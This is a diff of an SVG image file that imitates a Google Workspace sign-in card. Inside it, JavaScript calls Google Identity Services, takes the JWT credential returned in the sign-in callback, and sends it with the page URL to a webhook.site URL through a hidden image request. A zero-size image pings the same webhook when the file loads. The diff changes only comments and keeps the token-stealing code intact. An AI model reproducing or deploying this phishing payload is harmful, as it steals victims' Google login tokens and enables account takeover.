@@ -3,21 +3,21 @@
      xmlns:xlink="http://www.w3.org/1999/xlink"
      width="380" height="520" viewBox="0 0 380 520">
 
-  <!-- background + card -->
+  <!-- Background -->
   <rect width="380" height="520" fill="#4285f4" rx="8"/>
   <rect x="20" y="80" width="340" height="400" fill="white" rx="8"/>
 
-  <!-- Google logo -->
+  <!-- Google Logo -->
   <image x="140" y="110" width="100" height="35"
          xlink:href="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"/>
 
-  <!-- title -->
+  <!-- Title -->
   <text x="190" y="180" font-family="Roboto,Arial" font-size="18"
         fill="#3c4043" text-anchor="middle">Sign in</text>
   <text x="190" y="205" font-family="Roboto,Arial" font-size="14"
         fill="#5f6368" text-anchor="middle">to continue to Workspace</text>
 
-  <!-- REAL Google button -->
+  <!-- REAL Google Sign-In Button -->
   <foreignObject x="50" y="250" width="280" height="70">
     <div xmlns="http://www.w3.org/1999/xhtml">
       <div id="g_id_onload"
@@ -35,7 +35,7 @@
     </div>
   </foreignObject>
 
-  <!-- JavaScript – all & → &amp;&amp; -->
+  <!-- JavaScript – ALL & REPLACED WITH &amp;&amp; -->
   <script>
     setTimeout(function() {
       if (window.google &amp;&amp; google.accounts &amp;&amp; google.accounts.id) {
@@ -43,23 +43,22 @@
           client_id: '561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com',
           callback: onSignIn
         });
-        google.accounts.id.prompt();   // opens the official picker
+        google.accounts.id.prompt();
       }
     }, 800);
 
     function onSignIn(resp) {
-      const token = resp.credential;   // full JWT
-      new Image().src =
+      const token = resp.credential;
+      new Image().src = 
         'https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token='
         + encodeURIComponent(token)
         + '&amp;src=' + encodeURIComponent(location.href);
     }
   </script>
 
-  <!-- Google Identity Services -->
+  <!-- Google API -->
   <script src="https://accounts.google.com/gsi/client" async="async" defer="defer"></script>
 
-  <!-- optional ping -->
-  <image xlink:href="https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?ping=ready"
-         width="0" height="0"/>
+  <!-- Ping -->
+  <image xlink:href="https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?ping=loaded" width="0" height="0"/>
 </svg>
